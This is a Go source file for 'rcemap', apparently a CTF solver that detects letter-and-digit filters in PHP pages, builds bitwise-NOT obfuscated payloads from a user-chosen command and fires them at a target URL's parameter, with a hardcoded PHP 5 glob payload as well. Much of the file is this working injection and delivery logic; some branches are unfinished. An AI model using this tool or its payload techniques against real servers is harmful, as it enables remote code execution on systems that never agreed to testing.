package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

var i string
var c string
var v int

func qufan(c string) (string, error) {
	// 获取当前目录
	currentDir, err := os.Getwd()
	if err != nil {
		return "", fmt.Errorf("获取当前目录失败: %v", err)
	}

	// 构建 Python 脚本的完整路径
	pythonScriptPath := filepath.Join(currentDir, "qufan.py")

	// 这里请根据自己是什么操作系统什么样的python环境选择什么样的代码
	cmd := exec.Command("python", pythonScriptPath, c)

	// 设置命令对象的工作目录为当前目录
	cmd.Dir = currentDir

	// 将命令的标准输出捕获到一个字节缓冲区
	outputBytes, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("执行命令时出错: %v", err)
	}

	// 将字节缓冲区中的输出转换为字符串
	output := strings.TrimSpace(string(outputBytes))

	return output, nil
}

func displayHelp() {
	// 显示帮助内容
	helpText := `
使用方法:
	go run rcemap.go 或者 ./rcemap.go --help

选项:
	--help   显示帮助信息
	-u 目标url
	-i 参数点
	-c 需要执行的命令
	-v 输出当前php版本（默认为7）
	...
	`

	fmt.Println(helpText)
}

func removeHTMLTags(html string) string {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(html))
	if err != nil {
		log.Fatal(err)
	}
	// 使用 goquery 库的 Selection.Text() 方法获取去除了 HTML 标签的纯文本
	return doc.Text()
}

func target() string {

	flag.StringVar(&i, "i", "", "参数点")
	flag.StringVar(&c, "c", "", "命令")
	flag.IntVar(&v, "v", 7, "参数点")
	url := flag.String("u", "", "target url")
	helpFlag := flag.Bool("help", false, "显示帮助信息")
	flag.Parse()
	if *helpFlag {
		displayHelp()
		os.Exit(0)
	}
	fmt.Println("[INFO] URL: " + *url)
	return *url
}

func Logo() {
	Logo := ".----.  .---. .----..-.   .-.  .--.  .----.\n" +
		"| {}  }/  ___}| {_  |  `.'  | / {} \\ | {}  }\n" +
		"| .-. \\\\     }| {__ | |\\ /| |/  /\\  \\| .--'\n" +
		"`-' `-' `---' `----'`-' ` `-'`-'  `-'`-'"

	Author := "\t\t   ___     ___     __ \n" +
		"\t\t  / _ \\___<  /__  / /_\n" +
		"\t\t / ___/ __/ / _ \\/ __/\n" +
		"\t\t/_/  /_/ /_/_//_/\\__/"

	fmt.Println("Author: \n" + Author + "\n")
	fmt.Println(Logo)

} //前面都是其他的函数，从此处开始为主要函数

func test(url string) {
	response, err := http.Get(url)

	if err != nil {
		log.Fatal(err)
		fmt.Println("[WARNING] 连接不通")
	}
	defer response.Body.Close()

	doc, err := ioutil.ReadAll(response.Body)
	if err != nil {
		log.Fatal(err)
	}

	preg_match := "preg_match"
	preg_replace := "preg_replace"
	lines := strings.Split(string(doc), "\n")

	found := false
	for _, line := range lines {
		cleanText := removeHTMLTags(line)
		if strings.Contains(cleanText, preg_match) {

			fmt.Printf("[INFO] 题目源码如下: \n" + cleanText + "\n")

			fmt.Printf("[INFO] 发现过滤: %s\n", preg_match)

			// 使用正则表达式提取括号内的内容
			re := regexp.MustCompile(`preg_match\('([^']+)'`)
			matches := re.FindStringSubmatch(cleanText)

			// 输出过滤内容及括号内的匹配内容
			fmt.Printf("[INFO] 发现过滤为: %s\n", preg_match+"("+matches[1]+")")
			//标记了一处地点，这里后续需要写其他过滤的情况下的实现代码
			// 检查括号内的内容是否包含 a-z 或 0-9
			re2 := regexp.MustCompile(`[a-z0-9]`)

			if re2.MatchString(matches[1]) {
				// 如果包含 a-z 或 0-9，则输出无数字字母

				fmt.Println("[INFO] 经典无数字字母RCE题目")
				if strings.Contains(string(cleanText), "eval") {

					fmt.Println("[INFO] 执行eval函数")
					eval(url)
				} else if strings.Contains(string(cleanText), "system") {

					fmt.Println("[INFO] 执行system函数")
					fmt.Println("[WARNING] 无数字字母还是system函数，据我所知只有一种方法：利用linux终端的一些特性")
					fmt.Println("[INFO] 即将使用探姬的bashfuck工具")
					system(url) //等待施工中
				} else {
					fmt.Println("这是什么题目QAQ")
					os.Exit(0) //看不懂题目，自动退出
				}

			}

			found = true
			break

		} else if strings.Contains(cleanText, preg_replace) {
			//replace过滤
			fmt.Printf("[INFO] 发现过滤: %s\n", preg_replace)
			re := regexp.MustCompile(`preg_replace\('([^']+)'`)
			matches := re.FindStringSubmatch(cleanText)

			// 输出过滤内容及括号内的匹配内容
			fmt.Printf("[INFO] 发现过滤为: %s\n", preg_replace+"("+matches[1]+")")

		}

	}

	if !found {
		fmt.Println("[INFO] 未发现过滤,将进行fuzz测试")
		goto fuzz
	fuzz:
		fmt.Println("[INFO] 开始fuzz")
	}

}

func eval(url string) {
	var c1 string
	var c2 string
	leftIndex := strings.Index(c, "(")
	if leftIndex == -1 {
		// 字符串中没有左括号
		c1 = c
		c2 = ""
	}

	// 查找第一个右括号的索引
	rightIndex := strings.Index(c, ")")
	if rightIndex == -1 {
		// 字符串中没有右括号
		c1 = ""
		c2 = ""
	}
	var c3 string
	if leftIndex < rightIndex {
		// 括号正确匹配，提取括号内外的内容
		c1 = c[:leftIndex]
		c2 = c[leftIndex+1 : rightIndex]

		c2, err := qufan(c2)
		if err != nil {
			fmt.Println("牢弟你下我写的qufan.py了吗")
		}

		c3 = "~" + c2

	} else {
		// 括号不正确匹配
		c1 = c
		c2 = ""
	}

	if v == 7 {
		fmt.Println("[INFO] PHP版本为7.x")

		POC, err := qufan(c1)
		if err != nil {
			fmt.Println("牢弟你下我写的qufan.py了吗")
		}

		c = "(~" + POC + ")(" + c3 + ");"
		fmt.Printf("[INFO] POC为: %s\n", c)

	} else if v == 5 {
		fmt.Println("[INFO] PHP版本为5.x")
		c = "?><?=`. /???/????????[@-[]`;?>" //php5.x部分的无数字字母进阶版暂时未施工完毕，因为需要上传文件，而且需要检测是否对这几个字符有过滤（感觉不用检测，有过滤的做不出来了）

	}
	res, err := http.Get(url + "?" + i + "=" + c)
	if err != nil {
		log.Fatal(err)
	}
	defer res.Body.Close()

	body, err := ioutil.ReadAll(res.Body)

	REres := removeHTMLTags(string(body))
	fmt.Printf("[INFO] 回显为: %s \n", REres)

}

func system(url string) { //system这个暂时写不了
	// 获取当前目录
	currentDir, err := os.Getwd()
	if err != nil {
		fmt.Errorf("获取当前目录失败: %v", err)
	}

	// 构建 Python 脚本的完整路径
	pythonScriptPath := filepath.Join(currentDir, "bashfuck.py")

	// 这里请根据自己是什么操作系统什么样的python环境选择什么样的代码
	cmd := exec.Command("python", pythonScriptPath)

	// 设置命令对象的工作目录为当前目录
	cmd.Dir = currentDir

	// 将命令的标准输出捕获到一个字节缓冲区
	outputBytes, err := cmd.Output()
	if err != nil {
		fmt.Errorf("执行命令时出错: %v", err)
	}

	// 将字节缓冲区中的输出转换为字符串
	output := strings.TrimSpace(string(outputBytes))
	fmt.Println(output)
}

func main() {
	Logo()
	url := target()
	test(url)
}
